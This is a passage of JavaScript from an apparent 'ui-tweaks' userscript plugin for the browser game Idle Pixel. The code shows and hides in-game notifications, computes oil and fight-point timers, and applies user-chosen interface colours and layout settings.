                document.getElementById(""notification-giant_excavator"").style.display = ""none"";
                document.getElementById(""notification-massive_excavator"").style.display = ""none"";
            } else {
                const drill = getVar(""drill_on"", 0, ""int"");
                const crusher = getVar(""crusher_on"", 0, ""int"");
                const giant_drill = getVar(""giant_drill_on"", 0, ""int"");
                const excavator = getVar(""excavator_on"", 0, ""int"");
                const giant_excavator = getVar(""giant_excavator_on"", 0, ""int"");
                const massive_excavator = getVar(""massive_excavator_on"", 0, ""int"");

                if (drill > 0) {
                    document.getElementById(""notification-drill"").style.display = ""inline-block"";
                }
                if (crusher > 0) {
                    document.getElementById(""notification-crusher"").style.display = ""inline-block"";
                }
                if (giant_drill > 0) {
                    document.getElementById(""notification-giant_drill"").style.display = ""inline-block"";
                }
                if (excavator > 0) {
                    document.getElementById(""notification-excavator"").style.display = ""inline-block"";
                }
                if (giant_excavator > 0) {
                    document.getElementById(""notification-giant_excavator"").style.display = ""inline-block"";
                }
                if (massive_excavator > 0) {
                    document.getElementById(""notification-massive_excavator"").style.display = ""inline-block"";
                }
            }
        }

        oilTimerNotification() {
            const notifDiv = document.createElement(""div"");
            notifDiv.id = ""notification-oil_gain"";
            notifDiv.className = ""notification hover"";
            notifDiv.style.marginRight = ""4px"";
            notifDiv.style.marginBottom = ""4px"";
            notifDiv.style.display = ""none"";

            const elem = document.createElement(""img"");
            elem.setAttribute(""src"", `${UIT_IMAGE_URL_BASE}oil.png`);
            const notifIcon = elem;
            notifIcon.className = ""w20"";

            const notifDivLabel = document.createElement(""span"");
            notifDivLabel.id = ""notification-oil_gain-label"";
            notifDivLabel.innerText = "" Loading"";
            notifDivLabel.className = ""color-white"";

            notifDiv.appendChild(notifIcon);
            notifDiv.appendChild(notifDivLabel);

            const notificationFurnaceAvail = document.getElementById(
                ""notification-furnace_avail""
            );
            if (notificationFurnaceAvail) {
                notificationFurnaceAvail.parentNode.insertBefore(
                    notifDiv,
                    notificationFurnaceAvail
                );
                notifDiv.style.display = ""none"";
            }
        }

        oilGain() {
            const notificationFurnaceAvail = document.getElementById(
                ""notification-furnace_avail""
            );
            const oilDelta = getVar(""oil_delta"", 0, ""int"");
            const oil = getVar(""oil"", 0, ""int"");
            const oilMax = getVar(""max_oil"", 0, ""int"");
            const notificationOilGain = document.getElementById(
                ""notification-oil_gain""
            );
            const notificationOilGainLabel = document.getElementById(
                ""notification-oil_gain-label""
            );

            if (notificationOilGainLabel) {
                if (getThis.getConfig(""oilGainNotification"")) {
                    if (oilDelta === 0) {
                        notificationOilGainLabel.textContent = "" Balanced"";
                        notificationOilGain.style.display = ""inline-block"";
                    } else if (oilDelta < 0) {
                        const oilNega = (oilMax - (oilMax - oil)) / -oilDelta;
                        const oilNegETA = format_time(oilNega);
                        notificationOilGainLabel.textContent =
                            "" "" + oilNegETA + "" Until Empty"";
                        notificationOilGain.style.display = ""inline-block"";
                    } else if (oilDelta > 0 && oil !== oilMax) {
                        const oilPosi = (oilMax - oil) / oilDelta;
                        const oilPosETA = format_time(oilPosi);
                        notificationOilGainLabel.textContent =
                            "" "" + oilPosETA + "" Until Full"";
                        notificationOilGain.style.display = ""inline-block"";
                    } else if (oilDelta > 0 && oil === oilMax) {
                        notificationOilGain.style.display = ""none"";
                    }
                } else {
                    notificationOilGain.style.display = ""none"";
                }
            }
        }

        loot_pot_avail() {
            const notifDiv = document.createElement(""div"");
            notifDiv.id = `notification-loot_pot_avail`;
            notifDiv.className = ""notification hover"";
            notifDiv.style = ""margin-right: 4px; margin-bottom: 4px; display: none"";
            notifDiv.style.display = ""inline-block"";

            var elem = document.createElement(""img"");
            elem.setAttribute(""src"", `${UIT_IMAGE_URL_BASE}combat_loot_potion.png`);
            const notifIcon = elem;
            notifIcon.className = ""w20"";

            const notifDivLabel = document.createElement(""span"");
            notifDivLabel.id = `notification-loot_pot_avail-label`;
            notifDivLabel.innerText = "" Loot Pot Active"";
            notifDivLabel.className = ""color-white"";

            notifDiv.append(notifIcon, notifDivLabel);
            document.querySelector(""#notifications-area"").append(notifDiv);
        }

        fightPointsFull() {
            const max = getVar(""max_fight_points"", 0, ""int"");
            const current = getVar(""fight_points"", 0, ""int"");
            const remaining = max - current;
            const remaining_time = format_time(remaining);

            const fightPointsFullTimerMain = document.querySelector(
                ""#fight-points-full-id-menu""
            );
            const fightPointsFullTimerMain_2 = document.querySelector(
                ""#fight-points-full-id-menu_2""
            );
            const fightPointsFullTimerCombat = document.querySelector(
                ""#fight-points-full-id-combat""
            );

            if (remaining === 0) {
                fightPointsFullTimerMain.textContent = ""full"";
                fightPointsFullTimerCombat.textContent = ""full"";
            } else {
                var masterRingEquip = getVar(""master_ring_equipped"", 0, ""int"");
                if (masterRingEquip === 1) {
                    fightPointsFullTimerMain.textContent = format_time(remaining / 2);
                    fightPointsFullTimerMain_2.textContent = format_time(remaining / 2);
                    fightPointsFullTimerCombat.textContent = format_time(remaining / 2);
                } else {
                    fightPointsFullTimerMain.textContent = remaining_time;
                    fightPointsFullTimerMain_2.textContent = remaining_time;
                    fightPointsFullTimerCombat.textContent = remaining_time;
                }
            }
        }

        //Zlef Code Start
        addChatDisplayWatcher() {
            const chatElement = document.getElementById('game-chat');
            const panelRaidTeam = document.getElementById('raids-team-panel');
            if (!chatElement) {
                console.log('Chat element not found.');
                return;
            }

            const observer = new MutationObserver((mutations) => {
                mutations.forEach((mutation) => {
                    if (mutation.attributeName === 'style' && chatElement.style.display === 'none' && IdlePixelPlus.plugins['ui-tweaks'].getConfig(""combatChat"")) {
                        chatElement.style.display = 'block'; // Force chat to be visible
                    } else if (mutation.attributeName === 'style' && panelRaidTeam.style.display === 'none') {
                        document.getElementById('raids-advert-button').style.display = 'none';
                        document.getElementById('raids-start-button').style.display = 'none';
                    }
                });
            });

            observer.observe(chatElement, { attributes: true, attributeFilter: ['style'] });
            observer.observe(panelRaidTeam, { attributes: true, attributeFilter: ['style'] });
            //Initiator in onLogin
        }
        //Zlef Code End

        //////////////////////////////// updateColors Start ////////////////////////////////
        updateColors(filter) {
            const bgColorCheck = getThis.getConfig(""disableBGColorOverrides"");

            if (!bgColorCheck) {
                Object.keys(BG_COLORS).forEach((selector) => {
                    if (!filter || filter.includes(selector)) {
                        const key = selector.replace(/[#\.]/g, """").replace(/-?\s+-?/, ""-"");
                        const enabled = getThis.getConfig(`color-enabled-${key}`);
                        const color = enabled
                            ? getThis.getConfig(`color-${key}`)
                            : BG_COLORS[selector];
                        const selected = document.querySelectorAll(selector);

                        for (const element of selected) {
                            element.style.backgroundColor = color;
                        }
                    }
                });

                Object.keys(FONT_COLORS).forEach((selector) => {
                    if (!filter || filter.includes(selector)) {
                        const key = selector.replace(/[#\.]/g, """").replace(/-?\s+-?/, ""-"");
                        const enabled = getThis.getConfig(`font-color-enabled-${key}`);
                        const color = enabled
                            ? getThis.getConfig(`font-color-${key}`)
                            : FONT_COLORS[selector];
                        const selected = document.querySelectorAll(selector);

                        for (const element of selected) {
                            element.style.color = color;
                        }
                    }
                });

                const chatBorderOverrideColorEnabled = getThis.getConfig(
                    ""chatBorderOverrideColorEnabled""
                );
                const chatBorderOverrideColor = getThis.getConfig(
                    ""chatBorderOverrideColor""
                );
                if (chatBorderOverrideColorEnabled) {
                    const chatElements = document.querySelectorAll(""#game-chat.chat.m-3"");
                    for (const element of chatElements) {
                        element.style.borderColor = chatBorderOverrideColor;
                    }
                }

                const serverMessageTextOverrideEnabled = getThis.getConfig(
                    ""serverMessageTextOverrideEnabled""
                );
                const serverMessageTextOverrideColor = serverMessageTextOverrideEnabled
                    ? getThis.getConfig(""serverMessageTextOverrideColor"")
                    : ""blue"";
                const serverMessageElements = document.querySelectorAll(
                    ""#chat-area .server_message""
                );
                for (const element of serverMessageElements) {
                    element.parentElement.style.color = serverMessageTextOverrideColor;
                }
            }
            const bodyClassUpdate = document
                .getElementById(""body"")
                .className.replaceAll(""background-primary-gradient "", """");
            document.getElementById(""body"").className = bodyClassUpdate;
        }

        //////////////////////////////// updateColors end ////////////////////////////////

        //////////////////////////////// onConfigsChanged Start ////////////////////////////////
        onConfigsChanged() {
            if (onLoginLoaded) {
                getThis.fightPointsFull();
                getThis.miningMachTimer();
                uitRocket().configChange();

                document.body.style.fontFamily = """";
                const font = getThis.getConfig(""font"");
                if (font && font !== FONT_DEFAULT) {
                    const bodyStyle = document.body.getAttribute(""style"");
                    document.body.setAttribute(
                        ""style"",
                        `${bodyStyle}; font-family: ${font} !important`
                    );
                }

                const sideChat = getThis.getConfig(""sideChat"");
                if (sideChat) {
                    document.getElementById(""content"").classList.add(""side-chat"");
                } else {
                    document.getElementById(""content"").classList.remove(""side-chat"");
                }

                if (getThis.getConfig(""fightPointsStats"")) {
                    document.getElementById(""menu-bar-fight-points"").style.display =
                        ""inline-block"";
                }
                if (getThis.getConfig(""fightPointsStats"")) {
                    document.getElementById(""menu-bar-fight-points"").style.display =
                        ""inline-block"";
                    document.getElementById(""menu-bar-fight-fight-points"").style.display =
                        ""block"";
                } else {
                    document.getElementById(""menu-bar-fight-points"").style.display =
                        ""none"";
                    document.getElementById(""menu-bar-fight-fight-points"").style.display =
                        ""none"";
                }

                //////
                const condenseWoodcuttingPatches = getThis.getConfig(
                    ""condenseWoodcuttingPatches""
                );
                if (condenseWoodcuttingPatches) {
                    const farmingPatchesArea = document.querySelector(
                        ""#panel-woodcutting .farming-patches-area""
                    );
                    farmingPatchesArea.classList.add(""condensed"");
                    document
                        .querySelectorAll(
                            ""#panel-woodcutting .farming-patches-area img[id^='img-tree_shiny']""
                        )
                        .forEach(function (el) {
                            el.removeAttribute(""width"");
                            el.removeAttribute(""height"");
                        });
                } else {
                    const farmingPatchesArea = document.querySelector(
                        ""#panel-woodcutting .farming-patches-area""
                    );
                    farmingPatchesArea.classList.remove(""condensed"");
                    document
                        .querySelectorAll(
                            ""#panel-woodcutting .farming-patches-area img[id^='img-tree_shiny']""
                        )
                        .forEach(function (el) {
                            el.setAttribute(""width"", el.getAttribute(""original-width""));
                            el.setAttribute(""height"", el.getAttribute(""original-height""));
                        });
                }

                const condenseFarmingPatches = getThis.getConfig(
                    ""condenseFarmingPatches""
                );
                if (condenseFarmingPatches) {
                    const farmingPatchesArea = document.querySelector(
                        ""#panel-farming .farming-patches-area""
                    );
                    farmingPatchesArea.classList.add(""condensed"");
                    document
                        .querySelectorAll(
                            ""#panel-farming .farming-patches-area img[id^='img-farm_shiny']""
                        )
                        .forEach(function (el) {
                            el.removeAttribute(""width"");
                            el.removeAttribute(""height"");
                        });
                } else {
                    const farmingPatchesArea = document.querySelector(
                        ""#panel-farming .farming-patches-area""
                    );
                    farmingPatchesArea.classList.remove(""condensed"");
                    document
                        .querySelectorAll(
                            ""#panel-farming .farming-patches-area img[id^='img-farm_shiny']""
                        )
                        .forEach(function (el) {
                            el.setAttribute(""width"", el.getAttribute(""original-width""));
                            el.setAttribute(""height"", el.getAttribute(""original-height""));
                        });
                }

                const condenseGatheringBoxes = getThis.getConfig(
                    ""condenseGatheringBoxes""
                );
                if (condenseGatheringBoxes) {
                    const gatheringBoxes = document.querySelectorAll(
                        ""#panel-gathering .gathering-box""
                    );
                    gatheringBoxes.forEach(function (el) {
                        el.classList.add(""condensed"");
                    });
                } else {
                    const gatheringBoxes = document.querySelectorAll(
                        ""#panel-gathering .gathering-box""
                    );
                    gatheringBoxes.forEach(function (el) {
                        el.classList.remove(""condensed"");
                    });
                }

                if (getThis.getConfig(""imageTitles"")) {
                    const images = document.querySelectorAll(""img"");
                    images.forEach(function (el) {
                        const src = el.getAttribute(""src"");
                        if (src && src !== ""x"") {
                            const title = src.replace(/.*\//, """").replace(/\.\w+$/, """");
                            el.setAttribute(""title"", title);
                        }
                    });
                } else {
                    const images = document.querySelectorAll(""img"");
                    images.forEach(function (el) {
                        el.removeAttribute(""title"");
                    });
                }

                if (getThis.getConfig(""miningMachineArrows"")) {
                    const panelMining = document.querySelector(""#panel-mining"");
                    panelMining.classList.add(""add-arrow-controls"");
                } else {
                    const panelMining = document.querySelector(""#panel-mining"");
                    panelMining.classList.remove(""add-arrow-controls"");
                }
                //////
                document.addEventListener(""DOMContentLoaded"", function () {
                    const toast = document.querySelector("".toast-container"");
                    if (toast) {
                        if (getThis.getConfig(""lowerToast"")) {
                            toast.classList.remove(""top-0"");
                            toast.style.top = ""45px"";
                        } else {
                            toast.style.top = """";
                            toast.classList.add(""top-0"");
                        }
                    }
                });

                const oilSummaryMining = getThis.getConfig(""oilSummaryMining"");
                if (oilSummaryMining) {
                    document.getElementById(""oil-summary-mining"").style.display = ""block"";
                } else {
                    document.getElementById(""oil-summary-mining"").style.display = ""none"";
                }

                const oilSummaryCrafting = getThis.getConfig(""oilSummaryCrafting"");
                if (oilSummaryCrafting) {
                    document.getElementById(""oil-summary-crafting"").style.display =
                        ""block"";
                } else {
                    document.getElementById(""oil-summary-crafting"").style.display =
                        ""none"";
                }

                const smeltingNotificationTimer = getThis.getConfig(
                    ""smeltingNotificationTimer""
                );
                if (smeltingNotificationTimer) {
                    document.getElementById(""notification-furnace-timer"").style.display =
                        ""inline-block"";
                } else {
                    document.getElementById(""notification-furnace-timer"").style.display =
                        ""none"";
                }

                const heatInFishingTab = getThis.getConfig(""heatInFishingTab"");
                const heatFishingTab = document.getElementById(""heat-fishing-tab"");
                if (heatInFishingTab) {
                    heatFishingTab.style.display = ""block"";
                    heatFishingTab.setAttribute(""data-item"", ""heat"");
                } else {
                    heatFishingTab.style.display = ""none"";
                    heatFishingTab.removeAttribute(""data-item"");
                }

                const merchantReady = getThis.getConfig(""merchantReady"");
                const merchAvail = getVar(""merchant"");
                const merchantAvailNotification = document.getElementById(
                    ""notification-merchant_avail""
                );
                if (merchAvail === 1) {
                    if (merchantReady) {
                        merchantAvailNotification.style.display = ""inline-block"";
                    } else {
                        merchantAvailNotification.style.display = ""none"";
                    }
                }

                const mixerTimer = getThis.getConfig(""mixerTimer"");
                const mixerAvail = getVar(""brewing_xp_mixer_crafted"");
                const brewingMixerTimerNotification = document.getElementById(
                    ""notification-brewing_mixer_timer""
                );
                if (mixerAvail == 1) {
                    if (mixerTimer) {
                        brewingMixerTimerNotification.style.display = ""inline-block"";
                    } else {
                        brewingMixerTimerNotification.style.display = ""none"";
                    }
                }

                const robotReady = getThis.getConfig(""robotReady"");
                const robotAvail = getVar(""robot_crafted"");
                const robotAvailNotification = document.getElementById(
                    ""notification-robot_avail""
                );
                if (robotReady && robotAvailNotification) {
                    if (robotReady) {
                        robotAvailNotification.style.display = ""inline-block"";
                    } else {
                        robotAvailNotification.style.display = ""none"";
                    }
                }

                const drillNotifications = getThis.getConfig(""hideDrillNotifications"");
                if (drillNotifications) {
                    getThis.miningMachTimer();
                }

                //////
                const sdWatchShow = getThis.getConfig(""moveSDWatch"");
                const sdWatchUnlocked = getVar(""stardust_watch_crafted"", 0, ""int"");
                if (sdWatchShow && sdWatchUnlocked === 1) {
                    document.getElementById(""notification-stardust_watch"").style.display =
                        ""none"";
                    document.getElementById(""menu-bar-sd_watch"").style.display = ""block"";
                } else if (!sdWatchShow && sdWatchUnlocked === 1) {
                    document.getElementById(""notification-stardust_watch"").style.display =
                        ""inline-block"";
                    document.getElementById(""menu-bar-sd_watch"").style.display = ""none"";
                } else {
                    document.getElementById(""notification-stardust_watch"").style.display =
                        ""none"";
                    document.getElementById(""menu-bar-sd_watch"").style.display = ""none"";
                }

                const showHeat = getThis.getConfig(""showHeat"");
                if (showHeat) {
                    document.getElementById(""menu-bar-heat"").style.display = ""block"";
                } else {
                    document.getElementById(""menu-bar-heat"").style.display = ""none"";
                }

                getThis.onVariableSet(""oil"", window.var_oil, window.var_oil);

                getThis.updateColors();

                const combatInfoPanel = getThis.getConfig(""combatInfoSideSelect"");
                if (combatInfoPanel === ""left"") {
                    document.getElementById(
                        ""combat-info-fight_point-left""
                    ).style.display = ""block"";
                    document.getElementById(""combat-info-rare_pot-left"").style.display =
                        ""block"";
                    document.getElementById(""combat-info-loot_pot-left"").style.display =
                        ""block"";
                    document.getElementById(
                        ""combat-info-fight_point-right""
                    ).style.display = ""none"";
                    document.getElementById(""combat-info-rare_pot-right"").style.display =
                        ""none"";
                    document.getElementById(""combat-info-loot_pot-right"").style.display =
                        ""none"";
                } else {
                    document.getElementById(
                        ""combat-info-fight_point-left""
                    ).style.display = ""none"";
                    document.getElementById(""combat-info-rare_pot-left"").style.display =
                        ""none"";
                    document.getElementById(""combat-info-loot_pot-left"").style.display =
                        ""none"";
                    document.getElementById(
                        ""combat-info-fight_point-right""
                    ).style.display = ""block"";
                    document.getElementById(""combat-info-rare_pot-right"").style.display =
                        ""block"";
                    document.getElementById(""combat-info-loot_pot-right"").style.display =
                        ""block"";
                }

                const showPurpleKey = getThis.getConfig(""showPurpleKeyNotification"");
                const purpleKeyUnlock = getVar(""guardian_purple_key_hint"", 0, ""int"");
                if (showPurpleKey && purpleKeyUnlock === 1) {
                    document.getElementById(""notification-purple_key"").style.display =
                        ""inline-block"";
                } else {
                    document.getElementById(""notification-purple_key"").style.display =
                        ""none"";
                }

                const hideBoatNotifications = getThis.getConfig(""hideBoat"");
                const pirate_ship_timer = getVar(""pirate_ship_timer"", 0, ""int"");
                const row_boat_timer = getVar(""row_boat_timer"", 0, ""int"");
                const canoe_boat_timer = getVar(""canoe_boat_timer"", 0, ""int"");
                const stardust_boat_timer = getVar(""stardust_boat_timer"", 0, ""int"");
                if (hideBoatNotifications) {
                    document.getElementById(""notification-row_boat"").style.display =
                        ""none"";
                    document.getElementById(""notification-canoe_boat"").style.display =
                        ""none"";
                    document.getElementById(""notification-stardust_boat"").style.display =
                        ""none"";
                    document.getElementById(""notification-pirate_ship"").style.display =
                        ""none"";
                } else {
                    if (row_boat_timer > 0) {
                        document.getElementById(""notification-row_boat"").style.display =
                            ""inline-block"";
                    }
                    if (canoe_boat_timer > 0) {
                        document.getElementById(""notification-canoe_boat"").style.display =
                            ""inline-block"";
                    }
                    if (stardust_boat_timer > 0) {
                        document.getElementById(
                            ""notification-stardust_boat""
                        ).style.display = ""inline-block"";
                    }
                    if (pirate_ship_timer > 0) {
                        document.getElementById(""notification-pirate_ship"").style.display =
                            ""inline-block"";
                    }
                }

                setTimeout(function () {
                    if (document.getElementById(""notification-furnace_avail"")) {
                        const furnaceOreTypeVar = getVar(
                            ""furnace_ore_amount_set"",
                            0,
                            ""int""
                        );
                        const furnaceNotifVar = IdlePixelPlus.plugins[
                            ""ui-tweaks""
                        ].getConfig(""furnaceEmptyNotification"");
                        if (furnaceOreTypeVar <= 0 && furnaceNotifVar) {
                            document.getElementById(
                                ""notification-furnace_avail""
                            ).style.display = ""inline-block"";
                        } else {
                            document.getElementById(
                                ""notification-furnace_avail""
                            ).style.display = ""none"";
                        }
                    }
                }, 500);

                purpleKeyGo = getThis.getConfig(""showPurpleKeyNotification"");

                if (getThis.getConfig(""condensedUI"")) {
                    getThis.condensedUI();
                } else {
                    getThis.defaultUI();
                }
            }
        }
        //////////////////////////////// onConfigsChanged End ////////////////////////////////

        //////////////////////////////// onLogin Start ////////////////////////////////
        onLogin() {
            currUTCDate = new Date().getUTCDate();
            IPP = IdlePixelPlus;
            getVar = IdlePixelPlus.getVarOrDefault;
            getThis = IdlePixelPlus.plugins[""ui-tweaks""];
            document.getElementById(""menu-bar"").style.borderTop = ""1px solid grey"";
            document.getElementById(""menu-bar"").style.paddingTop = ""10px"";
            document.getElementById(""left-menu-bar-labels"").style.borderBottom =
                ""1px solid rgba(66,66,66,1)"";
            uitMisc().initStyles();
            uitLevel().initExtendedLevels();
            uitRocket().onLogin();
            uitSkills.forEach((skill) => {
                let xpVar = `var_ipp_${skill}_xp_next`;
                let xp = getVar(`${skill}_xp`, 0, ""int"");
                let level = uitLevel().xpToLevel(xp);
                const xpAtNext = uitLevel().LEVELS()[level + 1];
                const next = xpAtNext - xp;
                window[xpVar] = `${next}`;
            });

            uitPurpleKey().addPurpleKeyNotifications();
            uitCriptoe().initCriptoe();
            uitFishing().initFishing();
            uitRaids().initElements();

            getThis.updateColors();

            var loot_pot = getVar(""combat_loot_potion_active"", 0, ""int"");
            var merchantTiming = getVar(""merchant_timer"", 0, ""int"");
            var merchantUnlocked = getVar(""merchant"", 0, ""int"");
            let robotTiming = getVar(""robot_wave_timer"", 0, ""int"");
            var robotUnlocked = getVar(""robot_crafted"", 0, ""int"");
            const tableLabel = getThis.getConfig(""tableLabels"");
            getThis.loot_pot_avail();
            if (tableLabel) {
                uitTableLabels().addTableCraftLabels();
            }

            const addBrewerNotifications = (timer, charges) => {
                var mixerUnlocked = getVar(""brewing_xp_mixer_crafted"");
                const notifDiv = document.createElement(""div"");
                notifDiv.id = `notification-brewing_mixer_timer`;
                notifDiv.onclick = function () {
                    websocket.send(switch_panels(""panel-brewing""));
                    websocket.send(Modals.clicks_brewing_xp_mixer());
                };
                notifDiv.className = ""notification hover"";
                notifDiv.style = ""margin-bottom: 4px; display: none"";
                notifDiv.style.display = ""inline-block"";

                var elem = document.createElement(""img"");
                elem.setAttribute(""src"", `${UIT_IMAGE_URL_BASE}brewing_xp_mixer.png`);
                const notifIcon = elem;
                notifIcon.className = ""w20"";

                const notifDivLabel = document.createElement(""span"");
                notifDivLabel.id = `notification-brewing_mixer_timer-label`;
                notifDivLabel.innerText = "" "" + timer + "" ("" + charges + ""/5)"";
                notifDivLabel.className = ""color-white"";

                notifDiv.append(notifIcon, notifDivLabel);
                document.querySelector(""#notifications-area"").prepend(notifDiv);
                if (mixerUnlocked == 0) {
                    document.querySelector(""#brewing_mixer_timer"").style.display = ""none"";
                }
            };

            const brewingTimer = () => {
                var mixerUnlocked = getVar(""brewing_xp_mixer_crafted"");
                if (mixerUnlocked == 1) {
                    let playerTimer = getVar(""playtime"", 0, ""int"");
                    let chargesUsed = getVar(""brewing_xp_mixer_used"", 0, ""int"");
                    let chargesLeft = 5 - chargesUsed;
                    let playTimeMod =
                        1 - (playerTimer / 86400 - Math.floor(playerTimer / 86400));
                    let etaTimerBrew = format_time(playTimeMod * 86400);

                    const runBrewingTimer = setInterval(function () {
                        playerTimer = getVar(""playtime"", 0, ""int"");
                        chargesUsed = getVar(""brewing_xp_mixer_used"", 0, ""int"");
                        chargesLeft = 5 - chargesUsed;
                        playTimeMod =
                            1 - (playerTimer / 86400 - Math.floor(playerTimer / 86400));
                        etaTimerBrew = format_time(playTimeMod * 86400);
                        const brewingLabel = document.querySelector(
                            ""#notification-brewing_mixer_timer-label""
                        );
                        brewingLabel.innerText = ` ${etaTimerBrew} (${chargesLeft}/5)`;
                    }, 1000);

                    addBrewerNotifications(etaTimerBrew, chargesLeft);
                }
            };

            const addMerchantNotifications = () => {
                var merchantTimerCheck = getVar(""merchant_timer"", 0, ""int"");
                var merchantUnlocked = getVar(""merchant"", 0, ""int"");
                const notifDiv = document.createElement(""div"");
                notifDiv.id = `notification-merchant_avail`;
                notifDiv.onclick = function () {
                    websocket.send(switch_panels(""panel-shop""));
                };
                notifDiv.className = ""notification hover"";
                notifDiv.style = ""margin-right: 4px; margin-bottom: 4px; display: none"";
                notifDiv.style.display = ""inline-block"";

                var elem = document.createElement(""img"");
                elem.setAttribute(""src"", `${UIT_IMAGE_URL_BASE}merchant.png`);
                const notifIcon = elem;
                notifIcon.className = ""w20"";

                const notifDivLabel = document.createElement(""span"");
                notifDivLabel.id = `notification-merchant_avail-label`;
                notifDivLabel.innerText = "" Merchant Ready"";
                notifDivLabel.className = ""color-white"";

                notifDiv.append(notifIcon, notifDivLabel);
                document.querySelector(""#notifications-area"").prepend(notifDiv);
                if (merchantTimerCheck > 0 || merchantUnlocked == 0) {
                    document.querySelector(""#notification-merchant_avail"").style.display =
                        ""none"";
                }
            };

            const merchantTimer = () => {
                var merchantUnlocked = getVar(""merchant"", 0, ""int"");
                if (merchantUnlocked == 1) {
                    let merchantTiming = getVar(""merchant_timer"", 0, ""int"");
                    let etaTimerMerch = format_time(merchantTiming);
                    const runMerchantTimer = setInterval(function () {
                        merchantTiming = getVar(""merchant_timer"", 0, ""int"");
                        etaTimerMerch = format_time(merchantTiming);
                        const merchantLabel = document.querySelector(
                            ""#notification-merchant_avail-label""
                        );
                        if (merchantTiming == 0) {
                            merchantLabel.innerText = ` Merchant Ready`;
                            document.querySelector(
                                ""#notification-merchant_avail""
                            ).style.display = ""inline-block"";
                        } else {
                            document.querySelector(
                                ""#notification-merchant_avail""
                            ).style.display = ""none"";
                        }
                    }, 1000);

                    addMerchantNotifications(etaTimerMerch);
                }
            };

            const addFurnaceNotification = () => {
                if (getVar(""stone_furnace_crafted"", 0, ""int"") == 1) {
                    var furnaceOreType = getVar(""furnace_ore_type"", ""none"", ""string"");
                    var dragFur = getVar(""dragon_furnace"", 0, ""int"");
                    var ancFur = getVar(""ancient_furnace_crafted"", 0, ""int"");
                    var titFur = getVar(""titanium_furnace_crafted"", 0, ""int"");
                    var promFur = getVar(""promethium_furnace_crafted"", 0, ""int"");
                    var goldFur = getVar(""gold_furnace_crafted"", 0, ""int"");
                    var silvFur = getVar(""silver_furnace_crafted"", 0, ""int"");
                    var ironFur = getVar(""iron_furnace_crafted"", 0, ""int"");
                    var bronzeFur = getVar(""bronze_furnace_crafted"", 0, ""int"");
                    var stoneFur = getVar(""stone_furnace_crafted"", 0, ""int"");
                    var furnImg;

                    if (dragFur == 1) {
                        furnImg = `${UIT_IMAGE_URL_BASE}dragon_furnace.png`;
                    } else if (ancFur == 1) {
                        furnImg = `${UIT_IMAGE_URL_BASE}ancient_furnace.png`;
                    } else if (titFur == 1) {
                        furnImg = `${UIT_IMAGE_URL_BASE}titanium_furnace.png`;
                    } else if (promFur == 1) {
                        furnImg = `${UIT_IMAGE_URL_BASE}promethium_furnace.png`;
                    } else if (goldFur == 1) {
                        furnImg = `${UIT_IMAGE_URL_BASE}gold_furnace.png`;
                    } else if (silvFur == 1) {
                        furnImg = `${UIT_IMAGE_URL_BASE}silver_furnace.png`;
                    } else if (ironFur == 1) {
                        furnImg = `${UIT_IMAGE_URL_BASE}iron_furnace.png`;
                    } else if (bronzeFur == 1) {
                        furnImg = `${UIT_IMAGE_URL_BASE}bronze_furnace.png`;
                    } else if (stoneFur == 1) {
                        furnImg = `${UIT_IMAGE_URL_BASE}stone_furnace.png`;
                    } else {
                        document.querySelector(
                            ""#notification-furnace_avail""
                        ).style.display = ""none"";
                    }

                    const notifDiv = document.createElement(""div"");
                    notifDiv.id = `notification-furnace_avail`;
                    notifDiv.onclick = function () {
                        websocket.send(switch_panels(""panel-crafting""));
                    };
                    notifDiv.className = ""notification hover"";
                    notifDiv.style =
                        ""margin-right: 4px; margin-bottom: 4px; display: none"";
                    notifDiv.style.display = ""inline-block"";

                    var elem = document.createElement(""img"");
                    elem.setAttribute(""src"", furnImg);
                    const notifIcon = elem;
                    notifIcon.className = ""w20"";

                    const notifDivLabel = document.createElement(""span"");
                    notifDivLabel.id = `notification-furnace_avail-label`;
                    notifDivLabel.innerText = "" Furnace Empty"";
                    notifDivLabel.className = ""color-white"";

                    notifDiv.append(notifIcon, notifDivLabel);
                    document.querySelector(""#notifications-area"").prepend(notifDiv);
                    var furnaceNotif = getThis.getConfig(""furnaceEmptyNotification"");
                    if (furnaceOreType != ""none"" || !furnaceNotif) {
                        document.querySelector(
                            ""#notification-furnace_avail""
                        ).style.display = ""none"";
                    }
                }
            };

            const addRobotNotifications = () => {
                var robotTimerCheck = getVar(""robot_wave_timer"", 0, ""int"");
                var robotUnlocked = getVar(""robot_crafted"", 0, ""int"");
                const notifDiv = document.createElement(""div"");
                notifDiv.id = `notification-robot_avail`;
                notifDiv.onclick = function () {
                    websocket.send(Modals.open_robot_waves());
                };
                notifDiv.className = ""notification hover"";
                notifDiv.style = ""margin-right: 4px; margin-bottom: 4px; display: none"";
                notifDiv.style.display = ""inline-block"";

                var elem = document.createElement(""img"");
                elem.setAttribute(""src"", `${UIT_IMAGE_URL_BASE}robot.png`);
                const notifIcon = elem;
                notifIcon.className = ""w20"";

                const notifDivLabel = document.createElement(""span"");
                notifDivLabel.id = `notification-robot_avail-label`;
                notifDivLabel.innerText = "" Waves Ready"";
                notifDivLabel.className = ""color-white"";

                notifDiv.append(notifIcon, notifDivLabel);
                document.querySelector(""#notifications-area"").prepend(notifDiv);
                if (robotTimerCheck > 0 || robotUnlocked == 0) {
                    document.querySelector(""#notification-robot_avail"").style.display =
                        ""none"";
                }
            };

            const robotTimer = () => {
                let robotNotification = false;
                var robotUnlocked = getVar(""robot_crafted"", 0, ""int"");
                var thisScript = """";
                if (robotUnlocked == 1) {
                    let robotTiming = getVar(""robot_wave_timer"", 0, ""int"");
                    let etaTimerRobot = format_time(robotTiming);
                    const runRobotTimer = setInterval(function () {
                        robotNotification =
                            IdlePixelPlus.plugins[""ui-tweaks""].getConfig(""robotReady"");
                        robotTiming = getVar(""robot_wave_timer"", 0, ""int"");
                        etaTimerRobot = format_time(robotTiming);
                        const robotLabel = document.querySelector(
                            ""#notification-robot_avail-label""
                        );
                        if (robotTiming == 0 && robotNotification) {
                            //console.log(robotNotification);
                            robotLabel.innerText = ` Waves Ready`;
                            document.querySelector(
                                ""#notification-robot_avail""
                            ).style.display = ""inline-block"";
                        } else {
                            document.querySelector(
                                ""#notification-robot_avail""
                            ).style.display = ""none"";
                        }
                    }, 1000);

                    addRobotNotifications(etaTimerRobot);
                }
            };

            brewingTimer();
            merchantTimer();
            robotTimer();
            addFurnaceNotification();

            const lootPotAvail = document.querySelector(
                ""#notification-loot_pot_avail""
            );
            if (loot_pot == 0) {
                lootPotAvail.style.display = ""none"";
            } else {
                lootPotAvail.style.display = ""inline-block"";
            }

            const merchantAvail = document.querySelector(
                ""#notification-merchant_avail""
            );
            if (merchantAvail) {
